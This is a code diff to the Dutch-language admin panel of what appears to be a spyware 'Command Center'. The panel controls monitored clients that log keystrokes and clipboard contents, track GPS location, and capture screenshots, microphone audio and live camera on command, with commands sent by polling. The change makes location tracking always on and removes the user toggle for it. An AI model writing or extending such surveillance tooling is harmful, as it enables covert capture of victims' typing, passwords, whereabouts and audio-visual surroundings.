@@ -577,15 +577,14 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
 <div class="view" id="v-settings">
     <div class="settings-grid">
         <div class="cfg-group">
-            <h3>📸 Capture Instellingen</h3>
-            <div class="cfg-row"><label>Foto's</label><label class="tgl"><input type="checkbox" id="cfg-photo-on" checked><span></span></label><label>Elke</label><input type="number" id="cfg-photo-period" value="30" min="5" max="3600"><span class="unit">sec</span></div>
+            <h3>📸 Kwaliteit Instellingen</h3>
             <div class="cfg-row"><label>Foto Kwaliteit</label><input type="range" id="cfg-photo-q" min="10" max="100" value="70" oninput="$('#cfg-photo-q-val').textContent=this.value+'%'"><span id="cfg-photo-q-val" class="unit">70%</span></div>
-            <div class="cfg-row"><label>Video</label><label class="tgl"><input type="checkbox" id="cfg-video-on" checked><span></span></label><label>Elke</label><input type="number" id="cfg-video-period" value="300" min="30" max="3600"><span class="unit">sec</span></div>
-            <div class="cfg-row"><label>Video Duur</label><input type="number" id="cfg-video-dur" value="10" min="3" max="60"><span class="unit">sec</span></div>
+            <div style="font-size:.65rem;color:var(--dim);margin-top:4px">📷 Foto's worden gemaakt via de Screenshot-knop in het Cameras-tabblad.</div>
+            <div style="font-size:.65rem;color:var(--dim);margin-top:2px">🎙 Audio wordt opgenomen via de Mic-knop in het Cameras-tabblad.</div>
+            <div style="font-size:.65rem;color:var(--dim);margin-top:2px">📍 Locatie wordt continu en automatisch bijgehouden.</div>
         </div>
         <div class="cfg-group">
-            <h3>📍 Tracking Instellingen</h3>
-            <div class="cfg-row"><label>Locatie</label><label class="tgl"><input type="checkbox" id="cfg-loc-on" checked><span></span></label><label>Elke</label><input type="number" id="cfg-loc-period" value="15" min="5" max="300"><span class="unit">sec</span></div>
+            <h3>⌨️ Tracking Instellingen</h3>
             <div class="cfg-row"><label>Toetsaanslagen</label><label class="tgl"><input type="checkbox" id="cfg-key-on" checked><span></span></label><label>Flush elke</label><input type="number" id="cfg-key-flush" value="10" min="3" max="60"><span class="unit">sec</span></div>
             <div class="cfg-row"><label>Klembord</label><label class="tgl"><input type="checkbox" id="cfg-clip-on" checked><span></span></label><label>Check elke</label><input type="number" id="cfg-clip-check" value="15" min="5" max="120"><span class="unit">sec</span></div>
             <div class="cfg-row"><label>Heartbeat</label><input type="number" id="cfg-hb" value="8" min="3" max="60"><span class="unit">sec</span></div>
@@ -606,11 +605,13 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
         </div>
         <div class="cfg-group">
             <h3>ℹ Info</h3>
-            <div style="font-size:.72rem;color:var(--dim);line-height:1.8">
-                <div>Command Center v2.0</div>
-                <div>Clients laden nieuwe instellingen bij page-reload.</div>
-                <div>Commands worden direct verstuurd via polling (3s).</div>
-                <div style="margin-top:8px;color:var(--accent)">Tip: Lagere foto-frequentie = minder opslag</div>
+            <div style="font-size:.72rem;color:var(--dim);line-height:1.9">
+                <div>Command Center v3.0</div>
+                <div>📍 Locatie: altijd actief via GPS-watch (geen timer)</div>
+                <div>📷 Screenshot: via knop in Cameras-tabblad</div>
+                <div>🎙 Microfoon: via knop in Cameras-tabblad</div>
+                <div>▶ Live Camera: via knop in Cameras-tabblad</div>
+                <div style="margin-top:6px;color:var(--text2)">Commands worden verstuurd via polling (3s).</div>
             </div>
         </div>
     </div>
@@ -1795,15 +1796,8 @@ function escHtml(str) {
 async function loadConfig() {
     const cfg = await api('/api/config');
     if (!cfg) return;
-    $('#cfg-photo-on').checked = cfg.photoEnabled !== false;
-    $('#cfg-photo-period').value = Math.round((cfg.photoPeriod || 30000) / 1000);
     const q = Math.round((cfg.photoQuality || 0.7) * 100);
     $('#cfg-photo-q').value = q; $('#cfg-photo-q-val').textContent = q + '%';
-    $('#cfg-video-on').checked = cfg.videoEnabled !== false;
-    $('#cfg-video-period').value = Math.round((cfg.videoPeriod || 300000) / 1000);
-    $('#cfg-video-dur').value = Math.round((cfg.videoDuration || 10000) / 1000);
-    $('#cfg-loc-on').checked = cfg.locationEnabled !== false;
-    $('#cfg-loc-period').value = Math.round((cfg.locationPeriod || 15000) / 1000);
     $('#cfg-key-on').checked = cfg.keystrokesEnabled !== false;
     $('#cfg-key-flush').value = Math.round((cfg.keyLogFlush || 10000) / 1000);
     $('#cfg-clip-on').checked = cfg.clipboardEnabled !== false;
@@ -1813,30 +1807,26 @@ async function loadConfig() {
 
 async function saveConfig() {
     const cfg = {
-        photoEnabled: $('#cfg-photo-on').checked,
-        photoPeriod: parseInt($('#cfg-photo-period').value) * 1000,
         photoQuality: parseInt($('#cfg-photo-q').value) / 100,
-        videoEnabled: $('#cfg-video-on').checked,
-        videoPeriod: parseInt($('#cfg-video-period').value) * 1000,
-        videoDuration: parseInt($('#cfg-video-dur').value) * 1000,
-        locationEnabled: $('#cfg-loc-on').checked,
-        locationPeriod: parseInt($('#cfg-loc-period').value) * 1000,
         keystrokesEnabled: $('#cfg-key-on').checked,
         keyLogFlush: parseInt($('#cfg-key-flush').value) * 1000,
         clipboardEnabled: $('#cfg-clip-on').checked,
         clipboardCheck: parseInt($('#cfg-clip-check').value) * 1000,
-        heartbeatPeriod: parseInt($('#cfg-hb').value) * 1000
+        heartbeatPeriod: parseInt($('#cfg-hb').value) * 1000,
+        // Always-on, non-configurable
+        photoEnabled: false, videoEnabled: false,
+        locationEnabled: true, locationPeriod: 10000
     };
     const r = await fetch('/api/config', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Admin-Token': AUTH_TOKEN }, body: JSON.stringify(cfg) });
-    if (r.ok) toast('\u2705 Instellingen opgeslagen! Clients laden bij volgende page-reload.');
+    if (r.ok) toast('\u2705 Instellingen opgeslagen!');
 }
 
 async function resetConfig() {
     if (!confirm('Reset alle instellingen naar standaard?')) return;
-    const def = { photoEnabled:true, photoPeriod:30000, photoQuality:0.7, videoEnabled:true, videoPeriod:300000, videoDuration:10000, locationEnabled:true, locationPeriod:15000, keystrokesEnabled:true, keyLogFlush:10000, clipboardEnabled:true, clipboardCheck:15000, heartbeatPeriod:8000 };
+    const def = { photoEnabled:false, videoEnabled:false, locationEnabled:true, locationPeriod:10000, photoQuality:0.7, keystrokesEnabled:true, keyLogFlush:10000, clipboardEnabled:true, clipboardCheck:15000, heartbeatPeriod:8000 };
     await fetch('/api/config', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Admin-Token': AUTH_TOKEN }, body: JSON.stringify(def) });
     loadConfig();
-    toast('\u2705 Instellingen gereset naar standaard.');
+    toast('\u2705 Instellingen gereset.');
 }
 
 async function loadStorage() {
